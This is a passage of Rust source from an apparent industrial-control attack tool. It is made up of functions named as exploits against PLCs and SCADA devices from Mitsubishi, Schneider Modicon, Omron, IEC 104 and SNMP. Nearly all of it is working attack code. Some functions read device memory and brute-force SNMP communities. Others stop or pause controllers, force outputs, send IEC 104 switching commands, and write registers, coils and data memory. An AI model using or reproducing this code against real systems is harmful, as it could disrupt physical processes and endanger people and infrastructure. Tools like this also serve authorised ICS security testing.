        Err(e) => out(&format!("[-] {tag_name}: {e}")),
    }
}

// ─── Mitsubishi exploits ──────────────────────────────────────────────────────

pub fn exploit_mitsubishi_info(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::scan;
    out(&format!("[*] Getting Mitsubishi device info from {ip}..."));
    match scan::scan_ip(ip, 3, true) {
        Ok(devs) => {
            if devs.is_empty() {
                out("[-] No Mitsubishi device responded");
            }
            for d in &devs {
                out(&format!("  PLC Type: {}", d.plc_type));
                if let Some(title) = &d.title {
                    out(&format!("  Title:    {title}"));
                }
                if let Some(comment) = &d.comment {
                    out(&format!("  Comment:  {comment}"));
                }
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_mitsubishi_state(ip: &str, state: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::control;
    let iface = NetworkInterface {
        name: "auto".into(),
        ip: local_ip_for(ip),
        netmask: "255.255.255.0".into(),
    };
    out(&format!("[*] Setting Mitsubishi to {state}..."));
    match control::set_state_ip(&iface, ip, state) {
        Ok(true) => out(&format!("[+] State set to {state}")),
        Ok(false) => out("[!] Command sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_mitsubishi_set_pause(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::control;
    let iface = NetworkInterface {
        name: "auto".into(),
        ip: local_ip_for(ip),
        netmask: "255.255.255.0".into(),
    };
    out(&format!("[*] Setting Mitsubishi to pause on {ip}..."));
    match control::set_state_ip(&iface, ip, "pause") {
        Ok(true) => out("[+] State set to pause"),
        Ok(false) => out("[!] Command sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_mitsubishi_read_d(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::slmp;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "50"));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(50).min(960);
    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
    out(&format!("[*] Reading D{start}..D{end} from {ip}..."));
    match slmp::read_word_devices(ip, port, "D", start, count) {
        Ok(vals) => {
            let [hdr, sep] = slmp_header();
            out(&hdr);
            out(&sep);
            for v in &vals {
                out(&fmt_slmp_row(v));
            }
            out(&sep);
            out(&format!("[+] {} word(s)", vals.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_mitsubishi_read_m(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::slmp;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(3584);
    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
    out(&format!("[*] Reading M{start}..M{end} from {ip}..."));
    match slmp::read_bit_devices(ip, port, "M", start, count) {
        Ok(vals) => {
            let [hdr, sep] = slmp_header();
            out(&hdr);
            out(&sep);
            for v in &vals {
                out(&fmt_slmp_row(v));
            }
            out(&sep);
            out(&format!("[+] {} bit(s)", vals.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Modbus exploits ──────────────────────────────────────────────────────────

fn emit_modbus_interesting_limited(
    regs: &[casket::core::modbus::ModbusRegister],
    out: &dyn Fn(&str),
    printed: &mut usize,
    header_printed: &mut bool,
) -> usize {
    let mut total = 0usize;
    for r in regs.iter().filter(|r| r.raw != 0) {
        total += 1;
        if *printed < MODBUS_MAP_VALUE_OUTPUT_CAP {
            if !*header_printed {
                let [hdr, sep] = modbus_header();
                out(&hdr);
                out(&sep);
                *header_printed = true;
            }
            out(&fmt_modbus_row(r));
            *printed += 1;
        }
    }
    total
}

fn collect_modbus_points(
    table: ModbusTable,
    typ: &str,
    regs: &[casket::core::modbus::ModbusRegister],
    addrs: &mut Vec<String>,
    types: &mut Vec<String>,
    values: &mut Vec<String>,
) {
    for r in regs {
        addrs.push(table.point_key(u32::from(r.address)));
        types.push(typ.to_string());
        let value = match table {
            ModbusTable::Holding | ModbusTable::Input => r.raw.to_string(),
            ModbusTable::Coil | ModbusTable::Discrete => r.value_str.clone(),
        };
        values.push(value);
    }
}

pub fn exploit_modbus_map(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let ranges = match parse_modbus_map_input(input) {
        Ok(ranges) => ranges,
        Err(e) => {
            out(&format!("[-] {e}"));
            return;
        }
    };
    let mode = input.trim();
    let mode = if mode.is_empty() { "quick" } else { mode };
    out(&format!(
        "[*] Modbus map on {ip}:{} ({mode}, read-only)...",
        casket::core::modbus::effective_port(port)
    ));
    out("[*] Modbus exposes address tables, not semantic tag names; this maps readable ranges.");
    let mut points_addr = Vec::<String>::new();
    let mut points_type = Vec::<String>::new();
    let mut points_value = Vec::<String>::new();
    let mut readable_chunks = 0usize;
    let mut readable_values = 0usize;
    let mut failed_chunks = 0usize;
    let mut hidden_errors = 0usize;
    let mut skipped_chunks = 0usize;
    let mut interesting_total = 0usize;
    let mut interesting_printed = 0usize;
    let mut interesting_header_printed = false;

    for range in ranges {
        let chunks = modbus_map_chunks(range);
        out(&format!(
            "[*] {} {} {}..{} ({} value(s), {} chunk(s))",
            range.table.short_name(),
            range.table.label(),
            range.display_start(),
            range.display_end(),
            range.count,
            chunks.len()
        ));
        let mut consecutive_address_errors = 0usize;
        for (idx, (start, count)) in chunks.iter().copied().enumerate() {
            let result = match range.table {
                ModbusTable::Holding => modbus::read_holding_registers(ip, port, start, count),
                ModbusTable::Input => modbus::read_input_registers(ip, port, start, count),
                ModbusTable::Coil => modbus::read_coils(ip, port, start, count),
                ModbusTable::Discrete => modbus::read_discrete_inputs(ip, port, start, count),
            };
            match result {
                Ok(regs) => {
                    readable_chunks += 1;
                    readable_values += regs.len();
                    interesting_total += emit_modbus_interesting_limited(
                        &regs,
                        out,
                        &mut interesting_printed,
                        &mut interesting_header_printed,
                    );
                    collect_modbus_points(
                        range.table,
                        range.table.point_type(),
                        &regs,
                        &mut points_addr,
                        &mut points_type,
                        &mut points_value,
                    );
                    consecutive_address_errors = 0;
                }
                Err(e) => {
                    failed_chunks += 1;
                    if failed_chunks <= MODBUS_MAP_ERROR_OUTPUT_CAP {
                        let display_start = range.table.display_addr(u32::from(start));
                        let display_end = range
                            .table
                            .display_addr(u32::from(start) + u32::from(count) - 1);
                        out(&format!(
                            "[-] {} {}..{}: {e}",
                            range.table.short_name(),
                            display_start,
                            display_end
                        ));
                    } else {
                        hidden_errors += 1;
                    }
                    let error = e.to_string().to_ascii_lowercase();
                    let remaining_chunks = chunks.len().saturating_sub(idx + 1);
                    if error.contains("illegal function") {
                        skipped_chunks += remaining_chunks;
                        if remaining_chunks > 0 {
                            out(&format!("[!] {} table does not support this function; skipped {remaining_chunks} remaining chunk(s)", range.table.short_name()));
                        }
                        break;
                    }
                    if error.contains("illegal data address") || error.contains("illegal address") {
                        consecutive_address_errors += 1;
                        if consecutive_address_errors >= 3 && remaining_chunks > 0 {
                            skipped_chunks += remaining_chunks;
                            out(&format!("[!] {} table returned repeated illegal address errors; skipped {remaining_chunks} remaining chunk(s)", range.table.short_name()));
                            break;
                        }
                    } else {
                        consecutive_address_errors = 0;
                    }
                }
            }
        }
    }

    if hidden_errors > 0 {
        out(&format!(
            "[!] {hidden_errors} more unreadable chunk(s) omitted from output"
        ));
    }
    if skipped_chunks > 0 {
        out(&format!(
            "[!] {skipped_chunks} chunk(s) skipped after table-level Modbus exceptions"
        ));
    }
    if interesting_total > MODBUS_MAP_VALUE_OUTPUT_CAP {
        out(&format!(
            "[*] {} more non-default value(s) omitted from output",
            interesting_total - MODBUS_MAP_VALUE_OUTPUT_CAP
        ));
    }
    if readable_values == 0 {
        out("[!] No requested Modbus ranges were readable");
    } else if interesting_total == 0 {
        out(&format!("[+] {readable_values} value(s) read across {readable_chunks} chunk(s); all values were zero/OFF"));
    } else {
        out(&format!("[+] {readable_values} value(s) read across {readable_chunks} chunk(s); {interesting_total} non-default value(s) surfaced"));
    }
    if failed_chunks > 0 {
        out(&format!("[!] {failed_chunks} chunk(s) were unreadable"));
    }
    let _ = (points_addr, points_type, points_value);
}

pub fn exploit_modbus_holding(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
    out(&format!(
        "[*] Reading {count} holding registers from {ip} (start={start})..."
    ));
    match modbus::read_holding_registers(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} register(s)", regs.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_modbus_coils(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
    out(&format!(
        "[*] Reading {count} coils from {ip} (start={start})..."
    ));
    match modbus::read_coils(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} coil(s)", regs.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_modbus_input(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
    out(&format!(
        "[*] Reading {count} input registers from {ip} (start={start})..."
    ));
    match modbus::read_input_registers(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} register(s)", regs.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_modbus_discrete(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
    out(&format!(
        "[*] Reading {count} discrete inputs from {ip} (start={start})..."
    ));
    match modbus::read_discrete_inputs(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} discrete input(s)", regs.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_modbus_write_coil(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let (addr_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
    let addr: u16 = if let Ok(a) = addr_s.trim().parse() {
        a
    } else {
        out(&format!(
            "[-] Invalid coil address '{}': must be a number 0\u{2013}65535 (format: addr:on|off)",
            addr_s.trim()
        ));
        return;
    };
    let on = !state_s.trim().eq_ignore_ascii_case("off");
    out(&format!(
        "[*] Writing coil {addr} = {} on {ip}...",
        if on { "ON" } else { "OFF" }
    ));
    match modbus::write_single_coil(ip, port, addr, on) {
        Ok(()) => out(&format!("[+] Coil {addr} written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_modbus_write_register(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let (addr_s, val_s) = input.split_once(':').unwrap_or((input, "0"));
    let addr: u16 = if let Ok(a) = addr_s.trim().parse() {
        a
    } else {
        out(&format!("[-] Invalid register address '{}': must be a number 0\u{2013}65535 (format: addr:value)", addr_s.trim()));
        return;
    };
    let value: u16 = if let Ok(v) = val_s.trim().parse() {
        v
    } else {
        out(&format!(
            "[-] Invalid register value '{}': must be a decimal 0\u{2013}65535",
            val_s.trim()
        ));
        return;
    };
    out(&format!("[*] Writing register {addr} = {value} on {ip}..."));
    match modbus::write_single_register(ip, port, addr, value) {
        Ok(()) => out(&format!("[+] Register {addr} written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_modbus_write_registers(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modbus;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid register values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!(
        "[*] Writing {} registers starting at {start} on {ip}...",
        values.len()
    ));
    match modbus::write_multiple_registers(ip, port, start, &values) {
        Ok(n) => out(&format!("[+] {n} register(s) written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── SLMP exploits ────────────────────────────────────────────────────────────

fn emit_slmp_interesting_limited(
    vals: &[casket::vendors::mitsubishi::slmp::SlmpValue],
    out: &dyn Fn(&str),
    printed: &mut usize,
    header_printed: &mut bool,
) -> usize {
    let mut total = 0usize;
    for v in vals.iter().filter(|v| v.raw != 0) {
        total += 1;
        if *printed < MODBUS_MAP_VALUE_OUTPUT_CAP {
            if !*header_printed {
                out("[*] Non-default SLMP values:");
                let [hdr, sep] = slmp_header();
                out(&hdr);
                out(&sep);
                *header_printed = true;
            }
            out(&fmt_slmp_row(v));
            *printed += 1;
        }
    }
    total
}

pub fn exploit_slmp_map(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::slmp;
    let ranges = match parse_slmp_map_input(input) {
        Ok(ranges) => ranges,
        Err(e) => {
            out(&format!("[-] {e}"));
            return;
        }
    };
    let mode = input.trim();
    let mode = if mode.is_empty() { "quick" } else { mode };
    let effective_port = if port == 0 { slmp::DEFAULT_PORT } else { port };
    out(&format!(
        "[*] SLMP map on {ip}:{effective_port} ({mode}, read-only)..."
    ));
    out("[*] SLMP exposes device memory areas, not semantic tag names; this maps readable ranges.");

    let mut readable_chunks = 0usize;
    let mut readable_values = 0usize;
    let mut failed_chunks = 0usize;
    let mut hidden_errors = 0usize;
    let mut interesting_total = 0usize;
    let mut interesting_printed = 0usize;
    let mut interesting_header_printed = false;

    for range in ranges {
        let chunks = slmp_map_chunks(range);
        out(&format!(
            "[*] {} {}..{} ({} value(s), {} chunk(s))",
            range.device,
            range.display_start(),
            range.display_end(),
            range.count,
            chunks.len()
        ));
        for (start, count) in chunks {
            let result = match range.kind {
                SlmpDeviceKind::Word => {
                    slmp::read_word_devices(ip, port, range.device, start, count)
                }
                SlmpDeviceKind::Bit => slmp::read_bit_devices(ip, port, range.device, start, count),
            };
            match result {
                Ok(vals) => {
                    readable_chunks += 1;
                    readable_values += vals.len();
                    interesting_total += emit_slmp_interesting_limited(
                        &vals,
                        out,
                        &mut interesting_printed,
                        &mut interesting_header_printed,
                    );
                }
                Err(e) => {
                    failed_chunks += 1;
                    if failed_chunks <= MODBUS_MAP_ERROR_OUTPUT_CAP {
                        let end = start + u32::from(count) - 1;
                        out(&format!(
                            "[-] {}{}..{}{}: {e}",
                            range.device, start, range.device, end
                        ));
                    } else {
                        hidden_errors += 1;
                    }
                }
            }
        }
    }

    if hidden_errors > 0 {
        out(&format!(
            "[!] {hidden_errors} more unreadable chunk(s) omitted from output"
        ));
    }
    if interesting_total > MODBUS_MAP_VALUE_OUTPUT_CAP {
        out(&format!(
            "[*] {} more non-default value(s) omitted from output",
            interesting_total - MODBUS_MAP_VALUE_OUTPUT_CAP
        ));
    }
    if readable_values == 0 {
        out("[!] No requested SLMP ranges were readable");
    } else if interesting_total == 0 {
        out(&format!("[+] {readable_values} value(s) read across {readable_chunks} chunk(s); all values were zero/OFF"));
    } else {
        out(&format!("[+] {readable_values} value(s) read across {readable_chunks} chunk(s); {interesting_total} non-default value(s) surfaced"));
    }
    if failed_chunks > 0 {
        out(&format!("[!] {failed_chunks} chunk(s) were unreadable"));
    }
}

pub fn exploit_slmp_write_d(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::slmp;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!(
        "[*] Writing {} D registers starting at D{start} on {ip}...",
        values.len()
    ));
    match slmp::write_word_devices(ip, port, "D", start, &values) {
        Ok(()) => out("[+] D registers written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_slmp_write_m(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::mitsubishi::slmp;
    let (start_s, bits_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let values: Vec<bool> = bits_s
        .trim()
        .chars()
        .filter_map(|c| match c {
            '0' => Some(false),
            '1' => Some(true),
            _ => None,
        })
        .collect();
    if values.is_empty() {
        out("[-] No valid bits provided (format: start:0101...)");
        return;
    }
    out(&format!(
        "[*] Writing {} M bits starting at M{start} on {ip}...",
        values.len()
    ));
    match slmp::write_bit_devices(ip, port, "M", start, &values) {
        Ok(()) => out("[+] M bits written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── FC90 exploits ────────────────────────────────────────────────────────────

pub fn exploit_fc90_stop(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modicon_fc90;
    out(&format!(
        "[*] FC90 STOP command to {ip} (M340/Quantum/Premium)..."
    ));
    match modicon_fc90::stop_plc(ip, port) {
        Ok(true) => out("[+] PLC stopped (ack received)"),
        Ok(false) => out("[!] Command sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_fc90_start(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modicon_fc90;
    out(&format!(
        "[*] FC90 START command to {ip} (M340/Quantum/Premium)..."
    ));
    match modicon_fc90::start_plc(ip, port) {
        Ok(true) => out("[+] PLC started (ack received)"),
        Ok(false) => out("[!] Command sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_fc90_stop_tm221(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 STOP TM221 to {ip}..."));
    match modicon_fc90::stop_tm221(ip, port) {
        Ok(true) => out("[+] TM221 stopped"),
        Ok(false) => out("[!] Command sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_fc90_start_tm221(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 START TM221 to {ip}..."));
    match modicon_fc90::start_tm221(ip, port) {
        Ok(true) => out("[+] TM221 started"),
        Ok(false) => out("[!] Command sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_fc90_force(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::modicon_fc90::{self, ForceState};
    let (byte_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
    let output_byte =
        u8::from_str_radix(byte_s.trim().trim_start_matches("0x"), 16).unwrap_or(0x11);
    let state = match state_s.trim().to_lowercase().as_str() {
        "off" => ForceState::Off,
        "unforce" => ForceState::Unforce,
        _ => ForceState::On,
    };
    out(&format!(
        "[*] FC90 Force output 0x{output_byte:02x} to {state_s} on {ip}..."
    ));
    match modicon_fc90::force_output_bit(ip, port, output_byte, state) {
        Ok(true) => out("[+] Force command sent"),
        Ok(false) => out("[!] Command sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Omron exploits ───────────────────────────────────────────────────────────

pub fn exploit_omron_info(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::omron::fins;
    out(&format!("[*] Getting Omron device info from {ip}..."));
    match fins::get_device_info_tcp(ip, port) {
        Ok(dev) => {
            out(&format!("  Model:    {}", dev.model));
            out(&format!("  Version:  {}", dev.version));
            out(&format!("  Node:     0x{:02x}", dev.node_addr));
            out("[+] Device info retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_omron_read_dm(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::omron::fins;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "10"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(10).min(100);
    out(&format!(
        "[*] Reading DM{start}..DM{} from {ip}...",
        start + count - 1
    ));
    match fins::read_dm_words(ip, port, 0, start, count) {
        Ok(vals) => {
            out(&format!("  {:<8}  {:<8}  {}", "Address", "Dec", "Hex"));
            out(&format!("  {:─<8}  {:─<8}  {:─<6}", "", "", ""));
            for (i, &v) in vals.iter().enumerate() {
                out(&format!(
                    "  DM{:<6}  {:<8}  {v:#06x}",
                    start + u16::try_from(i).unwrap_or(u16::MAX),
                    v
                ));
            }
            out(&format!("[+] {} word(s)", vals.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_omron_write_dm(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::omron::fins;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!(
        "[*] Writing {} DM word(s) at DM{start} on {ip}...",
        values.len()
    ));
    match fins::write_dm_words(ip, port, 0, start, &values) {
        Ok(()) => out("[+] DM words written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_omron_cpu_status(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::omron::fins;
    out(&format!("[*] Reading CPU status from {ip}..."));
    match fins::get_cpu_state(ip, port, 0) {
        Ok(state) => out(&format!("[+] CPU State: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_omron_cpu_run(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::omron::fins;
    out(&format!(
        "[*] Setting Omron CPU to RUN (Monitor mode) on {ip}..."
    ));
    match fins::set_cpu_mode(ip, port, 0, true) {
        Ok(true) => out("[+] CPU set to Monitor/Run mode"),
        Ok(false) => out("[!] Command sent: FINS error returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_omron_cpu_stop(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::omron::fins;
    out(&format!("[*] Setting Omron CPU to STOP on {ip}..."));
    match fins::set_cpu_mode(ip, port, 0, false) {
        Ok(true) => out("[+] CPU stopped"),
        Ok(false) => out("[!] Command sent: FINS error returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── IEC 104 exploits ─────────────────────────────────────────────────────────

pub fn exploit_iec104_gi(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::iec104::client;
    out(&format!("[*] IEC 104 General Interrogation to {ip}..."));
    match client::connect(ip, port) {
        Ok(mut sess) => {
            out("[+] STARTDT confirmed");
            match client::general_interrogation(&mut sess) {
                Ok(objs) => {
                    for obj in &objs {
                        out(&format!(
                            "  IOA {:>6}: type=0x{:02x} value={}",
                            obj.ioa, obj.type_id, obj.decoded
                        ));
                    }
                    out(&format!("[+] {} object(s) returned", objs.len()));
                }
                Err(e) => out(&format!("[-] GI failed: {e}")),
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_iec104_sc_on(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::iec104::client;
    let ioa = input.trim().parse::<u32>().unwrap_or(1);
    out(&format!(
        "[*] IEC 104 Single Command ON to IOA {ioa} on {ip}..."
    ));
    match client::connect(ip, port) {
        Ok(mut sess) => match client::single_command(&mut sess, ioa, true) {
            Ok(true) => out("[+] Single Command ON confirmed"),
            Ok(false) => out("[!] Command sent: negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_iec104_sc_off(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::iec104::client;
    let ioa = input.trim().parse::<u32>().unwrap_or(1);
    out(&format!(
        "[*] IEC 104 Single Command OFF to IOA {ioa} on {ip}..."
    ));
    match client::connect(ip, port) {
        Ok(mut sess) => match client::single_command(&mut sess, ioa, false) {
            Ok(true) => out("[+] Single Command OFF confirmed"),
            Ok(false) => out("[!] Command sent: negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_iec104_dc(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::iec104::client;
    let (ioa_s, state_s) = input.split_once(':').unwrap_or((input, "2"));
    let ioa = ioa_s.trim().parse::<u32>().unwrap_or(1);
    let state = state_s.trim().parse::<u8>().unwrap_or(2).clamp(1, 3);
    let state_name = match state {
        1 => "OFF",
        2 => "ON",
        _ => "INDETERMINATE",
    };
    out(&format!(
        "[*] IEC 104 Double Command IOA {ioa} state={state_name} on {ip}..."
    ));
    match client::connect(ip, port) {
        Ok(mut sess) => match client::double_command(&mut sess, ioa, state) {
            Ok(true) => out("[+] Double Command confirmed"),
            Ok(false) => out("[!] Command sent: negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── SNMP exploits ────────────────────────────────────────────────────────────

pub fn exploit_snmp_sys_info(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP system info from {ip}:{p}..."));
    let community_owned;
    let community = if input.trim().is_empty() {
        let Some(c) = client::discover_community(ip, p) else {
            out("[-] No SNMP response on any common community — try supplying the community string manually");
            return;
        };
        community_owned = c;
        community_owned.as_str()
    } else {
        input.trim()
    };
    let scalar = [
        oids::SYS_DESCR,
        oids::SYS_OBJECT_ID,
        oids::SYS_UPTIME,
        oids::SYS_CONTACT,
        oids::SYS_NAME,
        oids::SYS_LOCATION,
    ];
    let labels = [
        "sysDescr", "sysOID", "Uptime", "Contact", "Name", "Location",
    ];
    match client::get_multi(ip, p, community, &scalar) {
        Ok(results) => {
            out(&format!("  community = {community}"));
            for (i, (_, val)) in results.iter().enumerate() {
                out(&format!("  {:<10} = {}", labels[i], val.display()));
            }
            out("[+] System info retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_snmp_interfaces(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, enumerate};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP interface table from {ip}:{p}..."));
    let community_owned;
    let community = if input.trim().is_empty() {
        let Some(c) = client::discover_community(ip, p) else {
            out("[-] No SNMP response — try supplying the community string manually");
            return;
        };
        community_owned = c;
        community_owned.as_str()
    } else {
        input.trim()
    };
    match enumerate::get_interfaces(ip, p, community) {
        Ok(ifaces) if ifaces.is_empty() => out("[!] No interface entries returned"),
        Ok(ifaces) => {
            for i in &ifaces {
                let state = if i.oper_up { "up" } else { "DOWN" };
                out(&format!(
                    "  [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
                    i.index, i.descr, i.mac, state, i.speed_mbps, i.in_errors, i.out_errors
                ));
            }
            out(&format!("[+] {} interface(s)", ifaces.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_snmp_topology(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, enumerate};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP network topology from {ip}:{p}..."));
    let community_owned;
    let community = if input.trim().is_empty() {
        let Some(c) = client::discover_community(ip, p) else {
            out("[-] No SNMP response — try supplying the community string manually");
            return;
        };
        community_owned = c;
        community_owned.as_str()
    } else {
        input.trim()
    };
    match enumerate::get_topology(ip, p, community) {
        Ok(lines) if lines.is_empty() => out("[!] No IP/route/ARP data returned"),
        Ok(lines) => {
            for l in &lines {
                out(l);
            }
            out("[+] Topology data retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_snmp_community_scan(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::snmp::{client, oids};
    let p = if port == 0 { client::SNMP_PORT } else { port };
    out(&format!("[*] SNMP community scan on {ip}:{p}..."));
    let mut found = 0u32;
    for &c in oids::COMMON_COMMUNITIES {
